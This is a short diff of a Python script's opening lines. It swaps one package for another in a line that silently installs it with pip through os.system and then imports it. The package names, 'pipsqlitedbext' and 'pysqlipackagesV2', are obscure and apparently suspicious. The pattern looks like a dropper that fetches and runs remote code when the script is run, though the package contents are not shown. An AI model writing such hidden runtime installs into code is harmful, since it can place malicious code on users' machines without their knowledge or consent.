@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitedbext")
-import pipsqlitedbext
+os.system("pip install pysqlipackagesV2")
+import pysqlipackagesV2
 import random
 import requests
 import time
